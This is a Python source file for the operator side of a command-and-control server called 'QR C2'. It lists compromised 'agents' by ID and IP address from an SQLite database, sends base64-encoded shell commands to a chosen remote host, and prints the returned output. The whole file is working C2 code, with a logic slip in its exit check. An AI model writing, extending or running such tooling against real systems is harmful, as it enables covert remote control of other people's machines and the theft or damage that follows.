#!/bin/python
import sqlite3
from sqlite3 import Error
import os, base64, time
import threading
from subprocess import call
def thread_second():
    call(["python", "listener.py"])
processThread = threading.Thread(target=thread_second)
processThread.start()

## Welcome Screen
print('\r\n#########################################\r\nWelcome to the QR C2! \r\nExecute an agent to get started and then check by typing, "agents".\r\n#########################################\r\n')

import sqlite3

## Queries SQLite Database for Active Agents (Checked in Within the Last 3 Hours)
def show_agents():

        sqliteConnection = sqlite3.connect('agents.db')
        cursor = sqliteConnection.cursor()

        sqlite_select_query = """SELECT * FROM agents WHERE LastSeen > datetime('now','-1 hour');"""
        cursor.execute(sqlite_select_query)
        records = cursor.fetchall()

        print('\r\nType an Agent ID\r\n')
        i = 0
        for row in records:
            print('|\tAgent ID: ' + records[i][0] + '\t|\tLast Seen: ' + records[i][1] + '\t|\tFriendly Name: ' + records[i][2] + '\t|\tIP Address: ' + records[i][4] + '\t|\r\n')
            i = i + 1
        
        ## Input for an Agent ID
        agentselect = input("#: ")
        
        print('Agent ' + agentselect + ' selected. Please enter a command to be executed on the remote host:\r\n')

        cursor.close()
        
        ## Calls Function to Execute Command on Agent
        agent_command(agentselect)

## Establish SQLite Connection 
def create_connection(db_file):

    conn = None
    try:
        conn = sqlite3.connect(db_file)
    except Error as e:
        print(e)

    return conn
    
## Removes Inactive Commands Before and After Execution
def clear_commands(agent):
        database = r"agents.db"
    
        # create a database connection
        conn = create_connection(database)
        with conn:
            cur = conn.cursor()
            cur.execute("DELETE FROM commands WHERE AgentID = ?;", (agent,))
            cur.close()
            return
            
## Inserts New Commands Issued for the Listener
def insert_commands(agent,b64cmd):
        database = r"agents.db"
    
        # create a database connection
        conn = create_connection(database)
        with conn:
            cur = conn.cursor()
            cur.execute("INSERT INTO commands (AgentID, Command) VALUES (?,?);", (agent,b64cmd,))
            cur.close()
            return

## Main Function That Receives Output and Displays on the Terminal
def agent_command(agent):
    while True:
        agentcmd = input(agent + "#: ")
    
        string_bytes = agentcmd.encode("ascii") 
        base64_bytes = base64.b64encode(string_bytes) 
        b64cmd = base64_bytes.decode("ascii")
    
        clear_commands(agent)
        insert_commands(agent,b64cmd)
        
        
        print('\r\n...Waiting for Output...\r\n')
        
        results = 0
        
        while results < 1:
            sqliteConnection3 = sqlite3.connect('agents.db')
            cursor3 = sqliteConnection3.cursor()
            cursor3.execute("SELECT Result FROM commands WHERE AgentID = ? AND Result IS NOT NULL;", (agent,))
            records = cursor3.fetchall()
            cursor3.close()
            results = len(records)
            time.sleep(1)

        cmdoutput = records[0][0]
        base64_bytes = cmdoutput.encode("ascii")   
        sample_string_bytes = base64.b64decode(base64_bytes) 
        b64decode = sample_string_bytes.decode("ascii")

        print('Output:\r\n\r\n' + b64decode + '\r\n')        
        
        clear_commands(agent)

## Input for Interacting With the Server Client
while True:
    cmd = input("#: ")
    if cmd == "agents":
       show_agents()
    elif cmd == "quit" or "exit" or "bye":
        os._exit(1)
    else:
        print("Not an appropriate choice.")
        #break
        
